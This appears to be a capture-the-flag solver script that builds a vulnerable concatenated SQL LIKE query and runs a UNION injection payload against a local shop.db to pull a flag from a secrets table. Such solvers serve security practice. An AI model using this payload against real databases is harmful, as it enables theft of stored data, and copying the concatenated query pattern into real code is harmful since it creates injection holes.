#!/usr/bin/env python3
"""Run the injectable query against the shipped shop.db and extract the flag.

The web handler builds:  SELECT id, name, price FROM products WHERE name
LIKE '%<q>%'  -- we feed a UNION payload as <q> and execute the resulting SQL
against the shipped database, exactly as the server would.
"""

import os
import sqlite3

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
DB = os.path.join(ROOT, "shop.db")

# The attacker-controlled q parameter.
INJECTION = "' UNION SELECT id, secret, 0 FROM flags -- "


def main() -> None:
    query = "SELECT id, name, price FROM products WHERE name LIKE '%" + INJECTION + "%'"
    db = sqlite3.connect(DB)
    rows = db.execute(query).fetchall()
    db.close()
    for _id, name, _price in rows:
        if isinstance(name, str) and name.startswith("NCTF{"):
            print(name)
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
